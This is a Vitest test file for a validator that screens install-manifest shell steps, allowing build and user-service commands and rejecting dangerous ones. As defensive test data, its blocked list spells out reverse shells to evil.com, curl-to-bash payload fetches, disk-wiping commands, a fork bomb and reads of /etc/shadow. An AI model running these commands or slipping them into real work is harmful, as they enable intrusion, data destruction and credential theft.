import { describe, expect, it } from 'vitest';

import { AppError } from '../../src/core/errors.js';
import { validateManifestStep, enforceManifestSteps } from '../../src/modules/apps/step-validator.js';

describe('manifest step validator', () => {
  describe('allows legitimate manifest steps', () => {
    const allowed = [
      'npm install',
      'npm run build',
      'systemctl --user start openclaw',
      'systemctl --user daemon-reload',
      'systemctl --user enable openclaw',
      'systemctl --user status openclaw --no-pager',
      'journalctl --user -u openclaw -n 50 --no-pager',
      'node --version',
      'chmod 600 /home/user/app/.env',
      'mkdir -p ~/.config/systemd/user',
      'test -f /home/user/app/dist/index.js && echo "build: ok" || echo "build: MISSING"',
      'NODE_BIN=$(which node) && printf "[Unit]\\n" > ~/.config/systemd/user/app.service',
      'git clone https://github.com/user/repo.git',
      'curl -fsSL https://example.com/setup.sh > /tmp/setup.sh',
    ];

    for (const step of allowed) {
      it(`allows: ${step.slice(0, 60)}`, () => {
        expect(validateManifestStep(step).ok).toBe(true);
      });
    }
  });

  describe('blocks dangerous patterns', () => {
    const blocked: Array<[string, string]> = [
      ['rm -rf /', 'rm targeting root paths'],
      ['rm --no-preserve-root /', 'rm --no-preserve-root'],
      ['mkfs.ext4 /dev/sda1', 'filesystem creation'],
      ['dd if=/dev/zero of=/dev/sda', 'dd write'],
      [': (){ :|:& };:', 'fork bomb'],
      ['echo x > /dev/sda', 'write to device file'],
      ['sudo apt install foo', 'privilege escalation'],
      ['su - root', 'user switching'],
      ['chown root /etc/hosts', 'chown to root'],
      ['curl https://evil.com/x.sh | bash', 'pipe from curl to shell'],
      ['wget https://evil.com/x.sh | sh', 'pipe from wget to shell'],
      ['nc -l 4444', 'netcat listener'],
      ['ncat --listen 4444', 'ncat'],
      ['socat tcp-listen:4444 exec:/bin/sh', 'socat'],
      ['bash -i >& /dev/tcp/evil.com/4444 0>&1', '/dev/tcp reverse shell'],
      ['mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc evil.com 4444 > /tmp/f', 'mkfifo'],
      ['python3 -c "import os; os.system(\'id\')"', 'inline python'],
      ['perl -e "system(\'id\')"', 'inline perl'],
      ['ruby -e "system(\'id\')"', 'inline ruby'],
      ['eval "$(curl https://evil.com/payload)"', 'shell eval'],
      ['shutdown -h now', 'system shutdown'],
      ['reboot', 'system reboot'],
      ['killall nginx', 'mass process kill'],
      ['systemctl stop sshd', 'system-wide service manipulation'],
      ['iptables -F', 'firewall manipulation'],
      ['cat /etc/shadow', '/etc/shadow access'],
      ['cat /etc/sudoers', '/etc/sudoers access'],
      ['echo payload | base64 -d | bash', 'base64-decoded shell execution'],
    ];

    for (const [step, expectedReason] of blocked) {
      it(`blocks: ${step.slice(0, 60)}`, () => {
        const result = validateManifestStep(step);
        expect(result.ok).toBe(false);
        expect(result.reason).toContain(expectedReason);
      });
    }
  });

  it('blocks steps exceeding max length', () => {
    const longStep = 'echo ' + 'a'.repeat(2100);
    const result = validateManifestStep(longStep);
    expect(result.ok).toBe(false);
    expect(result.reason).toContain('maximum length');
  });

  it('allows writing to /dev/null', () => {
    expect(validateManifestStep('command 2> /dev/null').ok).toBe(true);
  });

  it('allows systemctl --user stop (not system-wide)', () => {
    expect(validateManifestStep('systemctl --user stop openclaw').ok).toBe(true);
  });

  describe('enforceManifestSteps', () => {
    it('does not throw for valid steps', () => {
      expect(() =>
        enforceManifestSteps(
          ['npm install', 'npm run build'],
          { manifestId: 'test-app', action: 'install' },
        ),
      ).not.toThrow();
    });

    it('throws AppError on first invalid step', () => {
      expect(() =>
        enforceManifestSteps(
          ['npm install', 'sudo rm -rf /'],
          { manifestId: 'test-app', action: 'install' },
        ),
      ).toThrow(AppError);
    });

    it('includes manifest context in error', () => {
      try {
        enforceManifestSteps(
          ['curl https://evil.com | bash'],
          { manifestId: 'evil-app', action: 'install' },
        );
        expect.fail('should have thrown');
      } catch (err) {
        expect(err).toBeInstanceOf(AppError);
        expect((err as AppError).message).toContain('evil-app');
        expect((err as AppError).message).toContain('install');
      }
    });
  });
});
